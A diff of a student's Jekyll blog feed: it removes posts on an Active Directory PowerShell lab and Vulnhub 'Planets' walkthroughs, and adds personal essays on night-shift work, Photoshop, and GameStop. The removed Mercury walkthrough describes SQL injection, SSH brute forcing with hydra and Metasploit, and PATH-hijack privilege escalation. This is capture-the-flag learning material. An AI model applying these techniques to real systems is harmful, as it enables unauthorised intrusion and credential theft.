@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-09T09:14:39-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cyber Turtle</title><subtitle>A cybersecurity student writing about cybersecurity things</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2025-01-08T17:53:33-05:00</published><updated>2025-01-08T17:53:33-05:00</updated><id>http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-09T15:24:57-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cyber Turtle</title><subtitle>A cybersecurity student writing about cybersecurity things</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2025-01-08T17:53:33-05:00</published><updated>2025-01-08T17:53:33-05:00</updated><id>http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
 
 <p>Jekyll requires blog post files to be named according to the following format:</p>
 
@@ -14,203 +14,632 @@
 <span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
 <span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">Active Directory Help Desk Lab</title><link href="http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk.html" rel="alternate" type="text/html" title="Active Directory Help Desk Lab" /><published>2023-04-20T06:00:00-04:00</published><updated>2023-04-20T06:00:00-04:00</updated><id>http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk</id><content type="html" xml:base="http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk.html"><![CDATA[<p>Active Directory Help Desk Lab: Using PowerShell
-In this blog post, I wanted to test my current knowledge of Active Directory and PowerShell in order to emulate a few real world scenarios. While the last few posts were all about installing and learning the basics, this post will be about implementing those basics in a real world scenario.</p>
+<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">My Experience Working the Night Shift</title><link href="http://localhost:4000/post/personal/2023/10/08/graveyard_shift.html" rel="alternate" type="text/html" title="My Experience Working the Night Shift" /><published>2023-10-08T18:53:33-04:00</published><updated>2023-10-08T18:53:33-04:00</updated><id>http://localhost:4000/post/personal/2023/10/08/graveyard_shift</id><content type="html" xml:base="http://localhost:4000/post/personal/2023/10/08/graveyard_shift.html"><![CDATA[<p>It was November of 2017. Eleven months after graduating from college, I was working in the job of nobody’s dreams: retail stock associate. Holiday season was fast approaching, and my manager at work approached me to ask a simple question.</p>
 
-<p>Changing Password</p>
+<p>“Are you available for overnights?”</p>
 
-<p>The first ‘lab’ or scenario that I want to do is a very simple password reset for a user. People forget their passwords all the time, they reuse passwords, they change passwords only slightly when they have to (think changing password to Password), they leave their passwords on a sticky note right next to their computer (or in a file on a desktop).</p>
+<p>“Yeah, absolutely,” I replied, with a sense of unease in my stomach.</p>
 
-<p>One thing that people do often is forget their passwords and get locked out of their own accounts. So for this scenario, a user gets locked out of their account and needs their password reset. The goal is to just reset a user’s password.</p>
+<p>I had just gotten into the stock team after weeks of being on the sales floor, and I was eager to stay there. I hated talking to people, and the crazy expectations of the sales floor were too stressful for me to handle. This was my first job out of college, and I was desperate to make a good impression. It won’t be permanent, I told myself.</p>
 
-<p>The first thing I need to do is get an unlucky user from my AD. I could just look at the list of users and grab somebody at random. However, to make it a little bit more interesting, and to keep experimenting with PowerShell, I want to use a script.</p>
+<p>And it was not permanent, but it was an experience I won’t forget. From late November of 2017 to April of 2018, I was working the graveyard shift at a retail job in a mall. Our job was to open boxes of shipment, put sensors on the merchandise in the boxes, and either place the new clothes on the sales floor or find room for it in the stockroom. The shift time was from 11 PM to 7 AM, sometimes going longer.</p>
 
-<p>A simple cmdlet saved as a .ps1 file. Get-ADUser -Filter * just gets all the AD users, and Get-Random picks out a random object. When I run it for the first time, it gives me this:</p>
+<p>I remember being told it was going to be a temporary thing just for the holidays. If there’s one thing that anybody who has worked retail can attest to, it is that managers lie. The next five months of my life I became nocturnal.</p>
 
-<p>Hildegarde Mortenson has been locked out of their account, and needs their password reset.</p>
+<p>The Shift</p>
 
-<p>Doing a little bit of research on resetting a user’s password, I found that you need to have a password that it is going to be reset to, and the user’s identity. I already have the identity, so now I just need to set the password.</p>
+<p>I live in Queens, New York, and I worked there during this time as well. During the day, the borough bustles with activity, especially on the busy street the mall I worked at was located. I would be getting ready for work at the same time everyone else was going to sleep for work the next day. While other people were tired, I was wide awake from the coffee I would have at around 10:00 PM at night.</p>
 
-<p>First, to set the password, you need to do something like this:</p>
+<p>Cities have a different character at night. When you’re walking the streets alone in the dark, you become aware of every sound. Every car passing, every siren blasting.</p>
 
-<p>In the screenshot, I’m essentially just setting a password variable, that way when I do the cmdlet to change passwords, I just call that variable.</p>
+<p>I remember walking down the streets of my neighborhood, trying to walk quickly to get to the bus stop so I wouldn’t have to wait an hour for the next bus. I remember for every person that passed me, I wondered if they were like me, working a job they hated that forced them to stay awake after hours.</p>
 
-<p>Next, I need to use this command to set the password for Hildegarde:</p>
+<p>I remember a feeling of paranoia that would sometimes come over me while I was on an empty bus. I couldn’t explain it, but I always felt like in the darkness, someone or something was watching me. I sometimes felt like the darkness itself was judging me. “Look what your life has come to.”</p>
 
-<p>The next part is optional, but in a real world scenario, this password would obviously need to be changed. So I used the below cmdlet to force Hildegarde to change the password at logon.</p>
+<p>Then after getting to the store, I saw the last of the day time workers getting ready to leave. Sometimes they would have to stay, because the store was a mess and there were eighty stacks of jeans that needed to be folded properly. Before actually getting into my duties for the day, I would help them finish so they could leave before midnight.</p>
 
-<p>In a previous lab, I think I set passwords to never expire, which is why I had to do the first command in the screenshot. So for Hildegarde, the password will expire, and she will need to change it at the next logon.</p>
+<p>And then my actual work began. If we got only fifty boxes of merchandise, it would be a light night. My shift ran from 11 PM to 7 AM most of the time, however I would rarely be leaving at 7. Most of the time, we would have to stay in order to complete all of our tasks. Those tasks were opening the boxes, folding the merchandise, censoring the merchandise, and finding somewhere to put the merchandise. Whether it was on the sales floor or in the stockroom.</p>
 
-<p>To test out if this worked, I booted up the Client1 virtual machine to try to log in as hmortenson.</p>
+<p>Most of the time it would go to the stockroom. A cramped, fluorescent lit room filled with merchandise and marketing tools. It was the dustiest room I have ever seen. The first time I spent any amount of time there, I actually got sick. I still went to work the next night, because I needed the money. There were mouse traps in every corner, there were probably other vermin around as well. Mice and cockroaches are just as native to New York as New Yorkers are, after all.</p>
 
-<p>Logging in, the new password worked, and it prompted the user to change the password. With a new password, Hildegarde can move on and do their work in peace, and hopefully she will remember the password.</p>
+<p>Photo by Wes Hicks on Unsplash
+The shelves were extremely high up, filled to the brim with clothes. One night, all the clothes on one shelf fell because someone crashed into the shelf. Dozens of women’s shirts and sweaters were on the floor. I had to pick them up, fold them and put them back. When I asked for help, the person I asked looked like they wanted to quit right then and there.</p>
 
-<p>Creating a New User</p>
+<p>The censoring was the worst part. They didn’t want us sitting down, because that would ‘slow us down’ in the words of management. I would be bent over, taking a little needle and putting it through the seam of a shirt or a pair of jeans. I lost count of the amount of times I’ve accidentally stabbed myself in my fingers. I never got blood on the clothes, but maybe someone else did.</p>
 
-<p>This challenge is going to be creating a new user using PowerShell. I’m sure there are countless scenarios where a new user needs to be added this way.</p>
+<p>Working in that stockroom taught me a valuable lesson. Whenever I buy clothes from anywhere, I will wash it before I wear it.</p>
 
-<p>Instead of going to my script to generate a random user, I went to fakenamegenerator.com to generate a new user.</p>
+<p>Photo by Anna Dziubinska on Unsplash
+When the shift finally ended, probably closer to 8 or 9 than 7, we would leave. And I would see the sun for the first time all day. It had a funny effect of making me more miserable, because I was so tired and hungry and just wanted to sleep, but the sun being high in the sky tricked my brain into wanting to stay awake.</p>
 
-<p>So I am creating the new user of William Shaeffer using cmdlets.</p>
+<p>And then I would go home, at around 9:30 AM, and fall asleep. I would wake up at around 4:30–5, and then do it all again.</p>
 
-<p>To go over the cmdlet, New-ADUser is the cmdlet to create new users, with all the parameters. -Name is the account name, -GivenName is the first name, -SamAccountName is the login name, and Account Password is the user’s password. All is well and good, however the one problem is that in the original cmdlet I forgot to enable the user.</p>
+<p>The Effects</p>
 
-<p>The way to fix that is just to use the Enable-ADAccount cmdlet. Now this new employee is ready to get to work.</p>
+<p>Human beings are not meant to be up at that hour, let alone actually staying up through the night. Our circadian rhythms naturally line up with the cycle of day of night. Staying up that late, through the night, even with four cups of black coffee, took a great deal of effort. Light-exposure basically keeps the body awake and alert, and as night time comes, our bodies get prepared for sleep.</p>
 
-<p>Creating a Group and Adding Users</p>
+<p>When most people think of circadian rhythms, they probably think of their sleeping habits. However, circadian rhythms also affect a lot more than just sleeping patterns. Digestion is also affected by the circadian rhythm. Poor sleeping habits have been linked to gastrointestinal problems.</p>
 
-<p>For the next scenario, I’m going to be creating a group in AD. Higher management wants a whole group filled with every employee that has the letter ‘x’ in their name. They want the group to be called “The X Group”.</p>
+<p>Photo by Mpho Mojapelo on Unsplash
+As a personal anecdote, when I was on these night shifts, I was also in every other way obsessed with my health. I would exercise every day, meticulously track my calories, and track my progress across each workout. As I look back on those days, I barely made any progress in strength or conditioning. In fact, I even gained 15 lbs while I was on these shifts. It wasn’t 15 lbs of muscle either, despite what I told myself.</p>
 
-<p>This task has a few steps. The first step is to get all the users with ‘x’ in their names. The second step is to create a new group, and the third step is to add all those users into that group.</p>
+<p>As another personal anecdote, on days when I did not work, I found it difficult to actually sleep. At night, when I wasn’t working, I fell asleep easily, but I did not stay asleep easily. Restless would be the best term to use for my sleeping habits.</p>
 
-<p>So, as a disclaimer, I did try to do this all in one powershell script, but I kept on running into errors and couldn’t figure out how to do it that way.</p>
+<p>The World Health Organization classified night shift work as a potential carcinogen. Proper sleeping habits are so important for health and quality of life.</p>
 
-<p>In order to get all the members, I did this cmdlet, which is just Get-ADUser with a few filters that are looking for the letter ‘x’ in the name. I then used Select-Object SamAccountName to get only their login names. I then put it all in a text document.</p>
+<p>After six months of these shifts, I asked to go back down to the morning/afternoon/anything-but-night shifts. I couldn’t take those night shifts anymore. Management agreed, and I never looked back.</p>]]></content><author><name></name></author><category term="post" /><category term="personal" /><category term="post" /><category term="personal" /><summary type="html"><![CDATA[It was November of 2017. Eleven months after graduating from college, I was working in the job of nobody’s dreams: retail stock associate. Holiday season was fast approaching, and my manager at work approached me to ask a simple question.]]></summary></entry><entry><title type="html">Photoshop Youtube</title><link href="http://localhost:4000/post/photoshop/2023/09/22/photoshop_youtube.html" rel="alternate" type="text/html" title="Photoshop Youtube" /><published>2023-09-22T18:53:33-04:00</published><updated>2023-09-22T18:53:33-04:00</updated><id>http://localhost:4000/post/photoshop/2023/09/22/photoshop_youtube</id><content type="html" xml:base="http://localhost:4000/post/photoshop/2023/09/22/photoshop_youtube.html"><![CDATA[<p>In around July of 2020, I purchased a subscription to the Adobe Creative Cloud in order to start learning more about Photoshop. My original goal was to learn a little bit about photo editing: color correction, portrait retouching, that kind of stuff. I had just returned to work after the Covid lockdowns were beginning to loosen up, was absolutely miserable at that job, and wanted a bit of a new creative outlet.</p>
 
-<p>After that, I created a .ps1 file that will create the group and add all the members to that group.</p>
+<p>I dabbled in photoshop in college, but I really wanted to dive deep into the software and learn the ins and outs. And in order to do that, I went to YouTube. In my first few days, I found this video.</p>
 
-<p>The powershell script is essentially just going through each user in the text file and adding it to ‘The X Group’.</p>
+<p>I was stunned when I watched that video. Watching that changed my view of what I could do with photoshop. I was introduced to photo manipulation as an artform. The four artists in the video became my photoshop heroes. I found other artists, but these four were the ones that I looked up to the most.</p>
 
-<p>I ran the script, and the group was created. When I checked the server manager, the group was there with all the members.</p>
+<p>Nemanja Sekulic</p>
 
-<p>Doing a couple of these tasks got me a little bit more comfortable with using PowerShell alongside Active Directory. The two of them are incredibly useful skills to have in any IT job, because so many organizations use AD. PS offers users many ways to play around with AD, ways that you can’t do in the server manager.</p>
+<p>The first artist featured in the video is photographer and digital artist Nemanja Sekulic. I was originally impressed by his science fiction and fantasy photo manipulations. Seeing his work was particularly astonishing for me, because it was exactly what I wanted to achieve with photoshop but didn’t think was possible. His YouTube channel had many tutorials, which when I started photo manipulation I treated like training wheels, in that before I was comfortable making my own artwork, I would follow his work.</p>
 
-<p>I’m looking forward to exploring more and developing my understanding of Active Directory and PowerShell.</p>]]></content><author><name></name></author><category term="post" /><category term="active directory" /><category term="post" /><category term="active directory" /><summary type="html"><![CDATA[Active Directory Help Desk Lab: Using PowerShell In this blog post, I wanted to test my current knowledge of Active Directory and PowerShell in order to emulate a few real world scenarios. While the last few posts were all about installing and learning the basics, this post will be about implementing those basics in a real world scenario.]]></summary></entry><entry><title type="html">The Planets: Mercury Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury.html" rel="alternate" type="text/html" title="The Planets: Mercury Walkthrough" /><published>2023-04-17T06:00:00-04:00</published><updated>2023-04-17T06:00:00-04:00</updated><id>http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury.html"><![CDATA[<p>When I went on to Vulnhub to look for a vulnerable machine to test my hacking skills, I found one called The Planets: Earth. I immediately started with that one, not knowing it was the third in a series. For this post, I’m going to be going through the first one, Mercury. I would eventually like to get to Venus at some point as well.</p>
+<p>PixImperfect</p>
 
-<p>There are two flags I needed to look for, a user flag and a root flag. The first thing I did was make a directory on the Kali machine that is going to hold all the enumeration/reconnaissance information. I didn’t want to have to run multiple nmap scans every time I wanted to check something, so I was going to make a habit of putting it all into files.</p>
+<p>When somebody first opens up Photoshop, they will be greeted with an interface that is probably more than a little intimidating. There will be so many tools and pages and buttons. A few thoughts will be going through someone’s mind. What is an adjustment layer versus an adjustment? How do I make somebody’s hair green? What is a blending mode? What is a mask?</p>
 
-<p>After setting up the machines, I wanted to figure out the IP address for the vulnerable machine. I did it the same way I did it in the Earth walkthrough, with an nmap scan of the network. The -o option for nmap puts it into a text file.</p>
+<p>Unmesh Dinda is the creator of the YouTube page PixImperfect, and when I was learning how to actually use the tools in Photoshop, his channel was the first stop. His photoshop tutorials are perfectly explained in such a way that anybody who has never even opened up photoshop could use at least a few tools after watching a few of his videos.</p>
 
-<p>The IP address is 192.168.56.24, and there are two ports open: port 22 for SSH, and port 8080 for HTTP. After that, I wanted to check out the web application. Since it’s on port 8080, I would have to browse to 192.168.56.24:8080.</p>
+<p>Benny Productions</p>
 
-<p>Initially, there is nothing there. Checking the page source also didn’t give me anything fruitful, so I went back to the command line to do a few scans.</p>
+<p>Benny Productions is the channel for Dutch photoshop wizard Benjamin van Valen. The first thing I thought when I saw him, and saw his techniques for rim lightning, was “that is genius”.</p>
 
-<p>I don’t know why all that information was in the nmap scan, as I had never seen that happen. But I got the service versions for SSH and http, and I got the operating system (linux 4.15–5.6).</p>
+<p>But then I saw his “realistified” series, and was flabbergasted by what he was able to accomplish with Photoshop. He basically took an illustration one of his fans would make, and make a ‘realistic’ version of it using stock images.</p>
 
-<p>I then used dirb to try to enumerate directories on the service. Doing that returned one directory, the robots.txt file. Going to that file didn’t really return anything useful.</p>
+<p>I think another thing I really appreciated about Benny was the photoshop battles series, where I was introduced to a lot of other artists. I saw their techniques, and tried to copy them/learn from them as best as I could. It felt like the door to a new world was opened when I found his channel.</p>
 
-<p>I did find, however, that trying directories that don’t exist gets a debug screen instead of the standard 404 error. Debugs are very useful for attackers, because they give information about how the service is operating. The more information it reveals, the better.</p>
+<p>Imad Awan</p>
 
-<p>This one gives a directory, /mercuryfacts.</p>
+<p>Imad Awan is a concept artist and illustrator who utilizes photo manipulation in a technique called photobashing. Photobashing is using a combination of stock images and digital painting techniques to create artwork. It’ll usually have a painterly feel to it, but some or all of the assets in the artwork will have originated from stock photos or 3D assets.</p>
 
-<p>This page has two pages: the first one is a fact about Mercury, and the second is a todo list.</p>
+<p>Imad Awan is an amazing artist, and his artwork originally appealed to me because I’m a huge fantasy nerd, and his work was obviously inspired by fantasy works like Lord of the Rings. I can’t draw to save my life, but his techniques in photobashing really helped my own work.</p>
 
-<p>The todo list is interesting, because of ‘direct mysql call’. A direct mysql call implies that there will be a page that is vulnerable to a SQL injection. Which is good, because I don’t know how to exploit django.</p>
+<p>The Rise and Fall of the Photo Manipulation Community</p>
 
-<p>Going on the Mercury Fact Page . If you look at the URL, http://192.168.56.24:8080/mercuryfacts/1/</p>
+<p>‘Rise and fall’ is absolutely an exaggeration.</p>
 
-<p>There is a number at the end of the URL. There are no other links to other facts, but if you change the number, you get the other facts.</p>
+<p>At the time I entered the space, photo manipulation blew up in popularity. Videos from the above creators, and others, were getting millions of views. The community was vibrant on places like Instagram and Twitter, and other art specific websites like Behance and (to a much lesser degree) DeviantArt.</p>
 
-<p>Playing around with it, if you put in a number larger than 8, it won’t return anything. Knowing that errors get a whole debug page, I started playing around with different inputs, and I got the below error message.</p>
+<p>Videos and speed arts about Photoshop content would get a huge amount of views, some of them breaking 1 million. People were watching tutorials, sharing their art online, and it was a great time to be an artist.</p>
 
-<p>So this is telling me that changing the number changes the SQL query. I want to exploit that even further. Through some googling, and finding this page, I figured out how I was going to word the SQL injection. I wanted to list the contents of the database, and since I know this is mysql, the way to do that would be through the way down below.</p>
+<p>One of the most popular videos from this time frame.
+I was a tiny fish in a large pond. My instagram page had at its peak less than 100 followers, but it still felt like I was a part of a vibrant community of digital artists who were all committed to the same growth and on the same journey.</p>
 
-<p>To try to explain how this works, the original SQL query is “SELECT fact FROM facts where id = 1”. The SQL query in the above is listing the tables in the database. If you go to the link above, which is a SQL injection cheat sheet, that is just listing the tables in the database. The AND 1=1 in there was necessary, because leaving it out would give me the debug screen. It doesn’t have to be AND 1=1, it could be AND 1=2 or something like that, and it would work.</p>
+<p>After a few years, however, the online community of photo manipulation has slowed down tremendously. The upload frequency of the big time photo manipulation channels dropped tremendously, as did their view counts. Their Instagram pages, like most Instagram pages nowadays, are infrequently updated.</p>
 
-<p>Through that output, I can see that there is a table called users. The next part took a few tries, but I managed to get a list of users.</p>
+<p>As someone who was in the community, I have a few theories.</p>
 
-<p>Going even further, if I change the SQL query just a little bit further, I can get their passwords.</p>
+<p>The first one is the most obvious to me. This time period I was talking about was the period of the pandemic, more people were spending time inside on their computer. A lot of people took up hobbies like digital art in order to alleviate boredom. Once the restrictions loosened up, more people were going out more, and thus spending less time on their computers.</p>
 
-<p>So now I have a list of passwords and usernames. I put them both into separate text files, and planned on brute forcing the ssh login. I could technically guess which password belongs to which user, but I wanted to test out a few different tools. There are a couple of ways to do this, and I’m going to show both of them.</p>
+<p>The second one is that a lot of the top dogs of the community weren’t full time content creators. They were full time artists who did content creation on the side. They had jobs, they had client work, they had personal projects. Content, especially videos, take up a lot of free time.</p>
 
-<p>The first way is through hydra, a password brute forcing tool. This tool can be used for many different services, but this one is for SSH. The screenshot above shows the password for the webmaster user. -L is for the list of usernames, -P is for the list of passwords, and the service (SSH) needs to be stated. The -t 4 is the number of tasks running. After I get the username, I use ssh to log in to the system.</p>
+<p>The third one is that the community was overtaken by AI created works. Not to get too far into anti-AI, but I do remember a time when every recommended post on my Instagram was an AI generated image. The first time you see one, you think “wow that looks really beautiful! Whoa, AI created that?” The fiftieth time you see it, you start to wonder where all the human artists went.</p>
 
-<p>The second option is to use metasploit, where there is an ssh_login module that will allow you to essentially do the exact same thing.</p>
+<p>This was around the time I distanced myself from the space, but I do remember AI splitting the community. Some people thought it was a mockery of artistic talent, and other people thought it was the future.</p>
 
-<p>You need to set the RHOSTS (target IP), and there are also a few other options. I set PASS_FILE and USER_FILE to my password file and username file. And then you just type run, and the module runs and sets up a session.</p>
+<p>The photo manipulation community isn’t dead, but it also isn’t on obvious platforms like Facebook, YouTube, Instagram and Twitter. I’ve been around the internet long enough to know that there are platforms out there where the reach is smaller, but the community is still active and encouraging. Photo manipulation is an old art, almost as old as photography itself, and it isn’t going away any time soon. It predates the actual Photoshop software, and there will always be room for it.</p>
 
-<p>Regardless of which way I choose to login, I am now in the system as the webmaster user. I got the first flag.</p>
+<p>I think I was drawn to it because I was always a pretty bad artist, but I had an eye for visuals and always wanted to explore it. The idea of stitching together elements from different photographs reminded me of the way that dreams work. Different memories combined together into a new one, whether it is a memory that came from fantasy, or a memory that showcases the beauty of everyday life.</p>
 
-<p>Now I need to get to root in order to get to the second flag.</p>
+<p>Photo manipulation was the only art form I actually excelled at. I can’t draw at all, despite trying multiple times to learn. My painting ability can best be described as ‘abstract’.</p>
 
-<p>I tried sudo -l, but this user is not allowed to run sudo on the machine. I tried to open /etc/passwd and /etc/shadow, but this user didn’t have the permissions to do that. I then tried to find binaries where the permissions are set.</p>
+<p>Every creative has an initial spark, something that makes them say “I want to do that!” Maybe it’s a movie, a book, a song, a piece of art so beautiful and astonishing it lingers in their minds years after seeing it. Maybe they saw it as a child and it led them to a lifelong journey of artistry, or maybe they saw it well into their adult lives and it led them to starting their art journey a little later. No matter what happens, internally or externally, that spark will always be there.</p>]]></content><author><name></name></author><category term="post" /><category term="photoshop" /><category term="post" /><category term="photoshop" /><summary type="html"><![CDATA[In around July of 2020, I purchased a subscription to the Adobe Creative Cloud in order to start learning more about Photoshop. My original goal was to learn a little bit about photo editing: color correction, portrait retouching, that kind of stuff. I had just returned to work after the Covid lockdowns were beginning to loosen up, was absolutely miserable at that job, and wanted a bit of a new creative outlet.]]></summary></entry><entry><title type="html">Gamestop’s Crypto Push</title><link href="http://localhost:4000/post/2023/09/10/gamestop_crypto.html" rel="alternate" type="text/html" title="Gamestop’s Crypto Push" /><published>2023-09-10T18:53:33-04:00</published><updated>2023-09-10T18:53:33-04:00</updated><id>http://localhost:4000/post/2023/09/10/gamestop_crypto</id><content type="html" xml:base="http://localhost:4000/post/2023/09/10/gamestop_crypto.html"><![CDATA[<p>It was around 2008 when my Playstation3 stopped working. I was 14 years old. My machine got the yellow light of death, and I had sent it to a video game repair company to try to fix it. They weren’t able to, and thanks to my teenage mind’s inability to figure out online payments, never even got my console back (but I also never paid for it!).</p>
 
-<p>This didn’t really give anything either, as webmaster isn’t allowed to run sudo.</p>
+<p>I remember my mom got me an XBox 360, and that became my console of choice for the seventh video game generation. Wanting some new games for it, I took all the PS3 games I had, I can’t remember how many but it was a significant amount (at least seven or eight), and took it to a local GameStop.</p>
 
-<p>Then I went and looked around mercury_proj, the only directory in the webmaster’s home directory. While I was there, I found a notes.txt file. It had a reference to project accounts, and linuxmaster, another user. Next to the usernames, it had what looked like base64 encoding.</p>
+<p>I think I got one XBox 360 game, Burnout Paradise, for all those PS3 games.</p>
 
-<p>And I was right. I switched over, and I was now linuxmaster instead of webmaster. This is horizontal privilege escalation, and is essentially switching over to another user instead of trying to get to root.</p>
+<p>I’ve been reluctant to go to a GameStop ever since.</p>
 
-<p>And I found that I could run sudo -l to figure out what I could do as this user.</p>
+<p>Fast forward a few years, I’m working in a mall that also contains a GameStop. Occasionally I’d go in to look at games and see if I could buy one, but with the digital age of gaming, it would just be easier to buy them online if I even wanted to play them. It would be cheaper too, because of frequent sales. GameStop never had sales going on, at least none that I could see, except for major holidays.</p>
 
-<p>So this is the one command that this user can run as sudo. It is literally just a binary that calls the tail command on the syslog file. Not really anything interesting about that by itself, but the interesting part of it is that it just calls the command without the full path.</p>
+<p>I am not a fan of GameStop as a company. I never was a fan of the company. The workers were all knowledgeable and friendly, but the actual merchandise inside was overpriced and the actual trade-in of physical games wasn’t consumer friendly. With digital games growing in popularity, it seemed like GameStop would go the way of Blockbuster: a relic of a bygone era.</p>
 
-<p>So when you execute a command in Linux, the system looks for the first executable with that name in the user’s path variable. It’s why when you type in a command, ‘pwd’ for instance, you don’t have to type in /usr/bin/pwd. That path is part of the user’s path variable, and so it looks for ‘pwd’ in that directory. You can set a custom path just by typing in ‘export PATH=[your path here]’. And you can see the path variable by using ‘echo $PATH’.</p>
+<p>In recent years, however, GameStop has transformed from a dying company to the fixation of meme stock trading. It has been a fascinating transformation.</p>
 
-<p>Bash scripts calling on commands that don’t have the full path run the risk of attackers exploiting the PATH variable. If that bash script can be run as root, then it is a vulnerability for privilege escalation. An attacker can change the path to whatever they want, make a script with the same name as the command, and then run the original bash script as sudo. When the script runs, it’ll run the malicious script instead of the original.</p>
+<p>Photo by Clay Banks on Unsplash
+A meme stock is a stock that gained notoriety through the usage of social media. It is not a kind term, it is usually used for stocks that are venerated on forums like Reddit’s r/wallstreetbets. In January of 2021, the video game retailer GameStop became one of the most recognizable meme stocks in the world when it was the center of a now infamous short squeeze.</p>
 
-<p>To explain what I did, I added my current directory to the path variable, created a file named tail that would switch over to root, changed it so that it was executable, and ran the command with sudo privileges. Sudo — -preserve-env=PATH basically says to use the current environmental factors, which I had changed. The binary was run, with the ‘tail’ script that was actually to switch user to root.</p>
+<p>NFTs are non-fungible tokens, a way of identifying digital ownership on a blockchain. In February of 2021, the NFT market exploded in popularity after digital artist Beeple sold his work, ‘Everydays: the First 5000 Days’ for millions of dollars. Every artist/celebrity started purchasing NFTs in the hopes of making that kind of money.</p>
 
-<p>And after that, I went over to the root directory to get the flag.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[When I went on to Vulnhub to look for a vulnerable machine to test my hacking skills, I found one called The Planets: Earth. I immediately started with that one, not knowing it was the third in a series. For this post, I’m going to be going through the first one, Mercury. I would eventually like to get to Venus at some point as well.]]></summary></entry><entry><title type="html">Vulnhub Earth Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html" rel="alternate" type="text/html" title="Vulnhub Earth Walkthrough" /><published>2023-04-10T06:00:00-04:00</published><updated>2023-04-10T06:00:00-04:00</updated><id>http://localhost:4000/post/hacking/2023/04/10/vulnub_earth</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html"><![CDATA[<p>This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.</p>
+<p>Cryptocurrency and meme stocks have a lot of overlap because both are highly speculative and highly volatile, and they both have dedicated online communities with a lot of overlap.</p>
 
-<p>The first thing I did on my Kali Linux machine was to see if the vulnerable machine was up and running, and to find out the machine’s IP address.</p>
+<p>After the short squeeze, GameStop’s trajectory as a company changed. It was no longer trying to just be a video game retailer. Leadership wanted to change it to become a more tech focused company. It leaned into its new reputation on the internet.</p>
 
-<p>My Kali Linux machine is 192.168.56.22, so Earth’s address must be 192.168.56.23. And according to the nmap scan, the ports open up are ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). Those two ports open up means there must be a web application. Before doing anything else, I opened up my browser in order to see what the web application looks like, and see if I can find anything I can use.</p>
+<p>A few months before the short squeeze, in August of 2020, investment company RC Ventures purchased 9% stakes in GameStop. RC Ventures is managed by Ryan Cohen, who was previously CEO of pet retailer Chewy. Cohen became Executive Chairman of GameStop, and under his leadership the company underwent a drastic restructuring.</p>
 
-<p>If you use http to view the web app, you will see a 400 error. However, if you use https, you will see a default web page. If you take a look at the certificate, you will see the DNS name for the web server.</p>
+<p>Ryan Cohen
